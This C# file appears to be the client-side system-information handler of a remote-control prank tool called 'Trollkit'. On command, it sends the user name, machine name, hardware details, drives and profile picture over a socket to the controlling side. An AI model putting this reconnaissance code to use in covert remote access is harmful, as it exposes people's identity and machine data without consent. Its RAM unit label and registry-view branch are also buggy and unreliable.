using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Trollkit_Library;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
	class SystemInfoHandler : ICommandHandler
	{
		[DllImport("kernel32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool GetPhysicallyInstalledSystemMemory(out ulong TotalMemoryInKilobytes);


		public override bool HandleCommand(Socket s, TransferCommandObject obj)
		{
			switch (obj.Command)
			{
				case "GetClientInfo":
					CollectAndReturnSystemInfo(s);
					return true;
			}

			return false;
		}

		private void CollectAndReturnSystemInfo(Socket s)
		{
			string userName = $"> {Environment.UserName} on {Environment.MachineName}";
			TransferCommandObject userNameTransferObject = new TransferCommandObject { Command = "ComputerName", Value = userName };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(userNameTransferObject));

			string cpu = GetCPUName();
			TransferCommandObject cpuTranfserObject = new TransferCommandObject { Command = "CPU", Value = cpu };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(cpuTranfserObject));

			string drives = GetSystemDrives();
			TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Value = drives };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));

			string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
			TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));

			//TODO: cpu, ram??, windows version, network, peripherals

			string osVersion = GetOSVersion();
			TransferCommandObject osVersionTransferObject = new TransferCommandObject { Command = "WindowsVersion", Value = osVersion };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(osVersionTransferObject));

			string gpuName = GetGPUName();
			TransferCommandObject gpuNameTransferObject = new TransferCommandObject { Command = "GPU", Value = gpuName };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(gpuNameTransferObject));

			string ramString = GetRamAmount();
			TransferCommandObject ramTransferObject = new TransferCommandObject { Command = "RAM", Value = ramString };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(ramTransferObject));

		}
		
		private string GetRamAmount()
		{
			ulong l;
			GetPhysicallyInstalledSystemMemory(out l);
			return ((l / 1024) /1024) + " Mb RAM";
		}

		private string GetGPUName()
		{
			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DEVICEMAP\VIDEO", false);
			if (key != null)
			{
				string notfound = "NotFound";
				string videoDriverLocation = key.GetValue(@"\Device\Video0", notfound).ToString();

				if (videoDriverLocation != notfound)
				{
					string[] splitInfo = videoDriverLocation.Replace(@"\", "|").Split('|');

					string path = $@"SYSTEM\CurrentControlSet\Control\Video\{splitInfo[splitInfo.Length - 2]}\{splitInfo[splitInfo.Length -1]}";

					RegistryKey key2 = Registry.LocalMachine.OpenSubKey(path, false);
					if (key2 != null)
					{
						string driverDescription = key2.GetValue(@"DriverDesc", notfound).ToString();
						if (driverDescription != notfound)
						{
							return driverDescription;
						}
						else
							return "Unkown GPU";
					}
				}
			}

			return "Unknown GPU";
		}



		private string GetCPUName()
		{
			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0", false);
			if (key != null)
			{
				string processor = key.GetValue("ProcessorNameString", "Unknown Processor").ToString();
				return processor;
			}

			return "Unknown Processor";
		}

		private string GetOSVersion()
		{
			RegistryKey key;

			if (Environment.Is64BitOperatingSystem)
			{
				key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
			}
			else
			{
				RegistryKey localKey = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);
				key = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
			}

			if (key != null)
			{
				string releaseId = key.GetValue("ReleaseId", "").ToString();
				string productName = key.GetValue("ProductName", "Unknown OS").ToString();

				string bit = Environment.Is64BitOperatingSystem ? "x64" : "x86";

				return $"{productName} [{releaseId}] ({bit})";
			}

			return "Unknown OS Version";
		}

		private string GetSystemDrives()
		{
			string returnString = "Available Drives: ";
			var drives = DriveInfo.GetDrives();
			foreach (DriveInfo info in drives)
			{
				if (info.IsReady)
				{
					returnString += $"({info.Name.Replace("\\", "")}) ";
				}
			}
			return returnString;
		}
	}
}
